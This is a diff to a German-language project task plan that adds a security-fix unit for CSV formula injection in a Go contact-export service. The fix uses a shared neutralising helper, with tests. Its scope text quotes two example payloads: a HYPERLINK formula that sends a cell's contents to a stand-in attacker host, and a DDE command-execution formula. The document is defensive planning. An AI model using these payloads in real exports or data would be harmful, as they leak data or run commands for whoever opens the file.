@@ -1012,7 +1012,7 @@ units:
     service: gateway
     model: sonnet
     deps: []
-    status: todo
+    status: done
     coverage_start: "internal/gateway 46,1 % · internal/email/contactlink 35,0 % (Run 32508843776)"
     scope: >
       Dritter Teil von `route_email.go`: Verknuepfung von Nachrichten mit Kontakten sowie
@@ -1904,3 +1904,47 @@ units:
       - go test -count=1 ./internal/gateway/ gruen, TestOpenAPIRouteDrift unveraendert gruen
       - Frontend-Verhalten bei 502 vs. 503 im Journal dokumentiert (unveraendert lassen oder
         Grund fuer die Aenderung nennen)
+
+  - id: fix-email-contacts-csv-export-formula-injection
+    phase: 4
+    service: email
+    model: sonnet
+    deps: []
+    status: todo
+    coverage_start: "n.a. (Sicherheits-Fix, kein Coverage-Ziel)"
+    scope: >
+      `internal/email/contact/export_service.go` (`ExportService.ExportCSV`, Zeile 86-131)
+      schreibt first_name/last_name/email/phone/company/position/notes unveraendert in
+      CSV-Zellen. Beginnt einer dieser Werte mit `=`, `+`, `-` oder `@`, interpretiert Excel
+      und LibreOffice die Zelle beim Oeffnen als Formel (CSV-Formel-Injection). Ein Kontakt
+      mit Nachname `=HYPERLINK("http://evil.example/"&A1,"x")` oder Notizen
+      `=cmd|'/C calc'!A0` fuehrt beim Anwender aus, der die Datei nur oeffnet — der Export
+      ist damit ein Angriffsweg von Daten, die ueber die normale Kontaktpflege eingegeben
+      wurden. Gefunden waehrend cov-gateway-email-contact-linking-import-export (Iteration 27,
+      2026-08-22), als Coverage-Unit bewusst NICHT gefixt (Coverage-Units aendern kein
+      Verhalten).
+    sources:
+      - backend/internal/email/contact/export_service.go
+      - backend/internal/email/contact/export_service_test.go
+    notes: >
+      Root Cause statt Symptom: EINE Hilfsfunktion (z. B. `neutralizeFormulaCell(s string)
+      string`), die jedem Feldwert direkt vor `row = append(row, ...)` vorgeschaltet wird —
+      nicht sieben Einzelfaelle von Hand patchen. Wer die Funktion an einer Stelle vergisst,
+      hat die Luecke nur verschoben.
+      Uebliche Neutralisierung: beginnt der Wert mit `=`, `+`, `-` oder `@`, ein fuehrendes
+      Apostroph (`'`) voranstellen (Excel behandelt die Zelle dann als Text) — NICHT den
+      Wert abschneiden oder den Datensatz verwerfen, die Auskunfts-/Exportpflicht bleibt
+      bestehen.
+      `ExportVCard` (selbe Datei, Zeile 163-230) ist nicht betroffen: vCard-Felder werden nicht
+      von Tabellenkalkulationen als Formeln interpretiert. Trotzdem gegenpruefen, nicht
+      annehmen — falls ein vCard-Reader mit CSV-Import-Bruecke betroffen sein koennte, gehoert
+      das in die Notes, nicht stillschweigend mit gefixt.
+      Test MUSS das reale Angriffsmuster seeden (Feld beginnt mit `=`) und beweisen, dass die
+      exportierte Zelle mit `'` beginnt oder sonst von keiner Tabellenkalkulation als Formel
+      gelesen wird — nicht nur, dass irgendeine Zeichenkette ersetzt wurde.
+    done_when:
+      - Alle sieben CSV-Exportfelder neutralisieren `=`, `+`, `-`, `@` am Feldanfang ueber
+        eine gemeinsame Funktion
+      - Ein Test seedet einen Kontakt mit einem Formel-Praefix und belegt die Neutralisierung
+      - Ein Test belegt, dass ein normaler Wert (kein Formel-Praefix) unveraendert bleibt
+      - go test -count=1 ./internal/email/contact/... gruen
